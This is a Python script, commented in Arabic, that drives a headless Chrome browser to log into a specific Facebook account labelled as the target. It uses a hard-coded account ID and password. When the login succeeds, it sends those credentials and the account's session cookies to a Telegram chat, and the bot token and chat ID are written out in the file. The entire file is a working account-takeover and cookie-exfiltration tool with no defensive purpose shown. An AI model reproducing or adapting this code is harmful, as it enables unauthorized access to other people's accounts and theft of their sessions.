import telebot
import time
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# إعداداتك الخاصة
TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
CHAT_ID = "5653032481"
bot = telebot.TeleBot(TOKEN)

# بيانات الحساب المطلوبة
TARGET_ID = "61583389620613"
TARGET_PASS = "jasser vodka"

def single_login():
    print(f"🚀 محاولة الدخول للحساب: {TARGET_ID}")
    
    opts = Options()
    opts.add_argument("--headless")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1")
    
    driver = webdriver.Chrome(options=opts)
    try:
        driver.get("https://m.facebook.com/login/")
        time.sleep(4)
        
        # إدخال البيانات
        driver.find_element(By.NAME, "email").send_keys(TARGET_ID)
        driver.find_element(By.NAME, "pass").send_keys(TARGET_PASS)
        
        # الضغط على زر الدخول
        try:
            driver.find_element(By.NAME, "login").click()
        except:
            driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
            
        time.sleep(10) # انتظار التحميل وفحص الحماية
        
        cookies = driver.get_cookies()
        if any(c['name'] == 'c_user' for c in cookies):
            msg = f"✅ نجح الدخول للحساب!\n🆔: {TARGET_ID}\n🔑: {TARGET_PASS}"
            bot.send_message(CHAT_ID, msg)
            
            # حفظ وإرسال الكوكيز
            cookie_path = "target_cookies.json"
            with open(cookie_path, "w") as f:
                json.dump(cookies, f)
            with open(cookie_path, "rb") as f:
                bot.send_document(CHAT_ID, f, caption="🍪 كوكيز الحساب المطلوب")
            print("Done! Check Telegram.")
        else:
            print("❌ فشل الدخول أو الحساب يحتاج تأكيد (Checkpoint).")
            bot.send_message(CHAT_ID, f"⚠️ فشل الدخول للحساب {TARGET_ID}.\nقد يكون الرقم سري خاطئ أو الحساب محمي.")
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    single_login()
